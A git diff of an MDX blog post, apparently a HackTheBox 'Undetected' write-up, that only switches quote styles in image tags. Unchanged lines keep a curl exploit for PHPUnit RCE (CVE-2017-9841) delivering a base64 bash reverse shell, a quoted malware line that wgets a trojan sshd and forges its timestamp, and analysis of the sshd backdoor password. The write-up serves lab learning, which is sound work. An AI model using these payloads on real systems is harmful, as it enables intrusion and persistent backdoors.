@@ -6,8 +6,8 @@ date: 2022-02-25
 image: hackthebox-undetected-writeup.webp
 ---
 
-import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
-import { components as MDXComponents } from '../../components/mdxComponents';
+import FixTheImageURL from "../../components/mdxComponents/FixTheImageURL.astro";
+import { components as MDXComponents } from "../../components/mdxComponents";
 export const components = MDXComponents;
 
 ## Nmap
@@ -37,13 +37,13 @@ Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
 
 It's a simple `static` page.
 
-<FixTheImageURL src='web.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web.png" slug="hackthebox-undetected-writeup" />
 
 ## store.djewelry.htb
 
 There is `one` link working that goes to `store.djewelry.htb`
 
-<FixTheImageURL src='web1.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web1.png" slug="hackthebox-undetected-writeup" />
 
 Let add this to our `/etc/hosts` file
 
@@ -66,11 +66,11 @@ Going over `store.djewelry.htb` Nothing interesting found.
 
 Simple `static` page.
 
-<FixTheImageURL src='web2.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web2.png" slug="hackthebox-undetected-writeup" />
 
 i found a `notice` that said they `migrate` there site and they don't take `orders` now.
 
-<FixTheImageURL src='web3.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web3.png" slug="hackthebox-undetected-writeup" />
 
 Let's fire up `gobuster`.
 
@@ -125,7 +125,7 @@ Before `analyzing` it let's use `strings command` to get the `readable` strings.
 
 Found a `hex` string inside `info` binary.
 
-<FixTheImageURL src='cmd.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="cmd.png" slug="hackthebox-undetected-writeup" />
 
 Let's `decode` it.
 
@@ -162,25 +162,25 @@ Session completed
 
 Let's check the `/vendor` directory which we found in `gobuster`
 
-<FixTheImageURL src='web4.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web4.png" slug="hackthebox-undetected-writeup" />
 
 There is `tons` of files and folders. I go inside `phpunit` and search on google for that `specific exploit`
 
 First `search` with first `directory` name.
 
-<FixTheImageURL src='web5.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web5.png" slug="hackthebox-undetected-writeup" />
 
 Found a `rce` poc.
 
-<FixTheImageURL src='web6.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web6.png" slug="hackthebox-undetected-writeup" />
 
 This `vernability` is not inside which we are `searching` but it's in `phpunit` library
 
-<FixTheImageURL src='web7.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web7.png" slug="hackthebox-undetected-writeup" />
 
 And we also have that `directory` present.
 
-<FixTheImageURL src='web8.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web8.png" slug="hackthebox-undetected-writeup" />
 
 ## PHPunit RCE PoC (CVE-2017-9841)
 
@@ -207,7 +207,7 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS85MDAxIDA+JjEK
 └──╼ [★]$ curl --data " <?php echo(shell_exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS85MDAxIDA+JjEK | base64 -d | bash'));?>" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 ```
 
-<FixTheImageURL src='cmd1.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="cmd1.png" slug="hackthebox-undetected-writeup" />
 
 Now we have the `shell` let's check all `user` present in the `machine`.
 
@@ -268,7 +268,7 @@ steven@production:~$
 
 Found a `mail` for `steven` user.
 
-<FixTheImageURL src='cmd2.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="cmd2.png" slug="hackthebox-undetected-writeup" />
 
 ## Steven Mail
 
@@ -312,7 +312,7 @@ sysadmin
 
 Let's find the `apache2` directory default directory (`/etc/apache2`).
 
-<FixTheImageURL src='cmd3.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="cmd3.png" slug="hackthebox-undetected-writeup" />
 
 Found inside `usr/lib/apache2`
 
@@ -339,13 +339,13 @@ Found a `mod_reader.so` file which is `last` updated
 
 Let's get this file in our `machine` and `analyze` that.
 
-<FixTheImageURL src='cmd4.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="cmd4.png" slug="hackthebox-undetected-writeup" />
 
 Again before running `ghidra` type stuff let's use `strings command`.
 
 And found a `b64` string.
 
-<FixTheImageURL src='cmd5.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="cmd5.png" slug="hackthebox-undetected-writeup" />
 
 After `decoding` it we found that it's `download` the `image.jpeg` and save that with `sshd` name and also change the `date` so we can't find that with `latest updated` file sort `commands`.
 
@@ -357,7 +357,7 @@ wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /u
 
 Let's `download` that `sshd` file.
 
-<FixTheImageURL src='cmd6.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="cmd6.png" slug="hackthebox-undetected-writeup" />
 
 ## Analyzing The SSDH Binary
 
@@ -367,7 +367,7 @@ And found a `auth_password` function.
 
 Inside that there is backdoor array with size 31 bytes
 
-<FixTheImageURL src='ghidra.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="ghidra.png" slug="hackthebox-undetected-writeup" />
 
 Save that `values` inside a file i called this `decomiple.c` because i got `syntax highlighting`.
 
@@ -401,7 +401,7 @@ backdoor._0_4_ = 0xf0e7abd6;
 
 And this value is negative `-0x5b` which will be the `invalid value` let's check the `character representation` in `ghidra`.
 
-<FixTheImageURL src='ghidra1.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="ghidra1.png" slug="hackthebox-undetected-writeup" />
 
 ```js
 ┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
@@ -418,25 +418,25 @@ backdoor._0_4_ = 0xf0e7abd6;
 
 Now let's use `CyberChef` to swap the `endianness`.
 
-<FixTheImageURL src='web9.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web9.png" slug="hackthebox-undetected-writeup" />
 
 And we use `31 bytes` length because we see before the `array is of 31 bytes`
 
-<FixTheImageURL src='ghidra2.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="ghidra2.png" slug="hackthebox-undetected-writeup" />
 
 Now `convert` this into `hex`.
 
-<FixTheImageURL src='web10.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web10.png" slug="hackthebox-undetected-writeup" />
 
 We got the `blob` because we also need to do `xor` that also.
 
-<FixTheImageURL src='web11.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="web11.png" slug="hackthebox-undetected-writeup" />
 
 And were we get this `96` key value?
 
 We can see `inside` the `while loop` it's `xor` with `0x96`.
 
-<FixTheImageURL src='ghidra3.png' slug='hackthebox-undetected-writeup' />
+<FixTheImageURL src="ghidra3.png" slug="hackthebox-undetected-writeup" />
 
 And i also provide the `CyberChef` decoding `password` link.
 
